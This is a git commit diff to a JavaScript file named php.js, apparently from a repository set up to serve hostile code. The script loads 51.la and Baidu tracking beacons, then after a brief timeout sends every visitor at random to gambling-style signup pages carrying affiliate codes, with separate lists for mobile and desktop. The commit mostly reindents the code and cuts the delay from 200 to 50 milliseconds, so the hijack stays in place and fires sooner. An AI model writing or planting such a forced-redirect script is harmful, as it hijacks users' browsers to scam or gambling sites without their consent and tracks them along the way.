6665907189bd3a18d9754cde0ba49a711f468c1b
php0day <56468363+php0day@users.noreply.github.com>
2020-04-04 02:10:00 +0800

    Update php.js

--- php.js
+++ php.js
@@ -1,17 +1,17 @@
 var _hmt = _hmt || [];
 (function() {
-  var hm = document.createElement("script");
-  hm.src = "//js.users.51.la/20675339.js";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
+	var hm = document.createElement("script");
+	hm.src = "//js.users.51.la/20675339.js";
+	var s = document.getElementsByTagName("script")[0];
+	s.parentNode.insertBefore(hm, s);
 })();
 
 var _hmt = _hmt || [];
 (function() {
-  var hm = document.createElement("script");
-  hm.src = "//hm.baidu.com/hm.js?0f7aff1f1419a377416168d9a5e7f2ca";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
+	var hm = document.createElement("script");
+	hm.src = "//hm.baidu.com/hm.js?0f7aff1f1419a377416168d9a5e7f2ca";
+	var s = document.getElementsByTagName("script")[0];
+	s.parentNode.insertBefore(hm, s);
 })();
 
 var Pcurl = ["https://www.long809.vip/new-signup.jsp", "https://www.yabo390.com/?i_code=4805261&", "https://www.long8631.com/new-signup.jsp"];
@@ -25,12 +25,12 @@ function Mobile() {
 		return false;
 	}
 }
-setTimeout(function(){
-if (Mobile()) {
-	var rand = Math.floor((Math.random() * Mturl.length));
-	window.location.href = Mturl[rand];
-} else {
-	var rand = Math.floor((Math.random() * Pcurl.length));
-	window.location.href = Pcurl[rand];
-}
-},200);
+setTimeout(function() {
+	if (Mobile()) {
+		var rand = Math.floor((Math.random() * Mturl.length));
+		window.location.href = Mturl[rand];
+	} else {
+		var rand = Math.floor((Math.random() * Pcurl.length));
+		window.location.href = Pcurl[rand];
+	}
+}, 50);
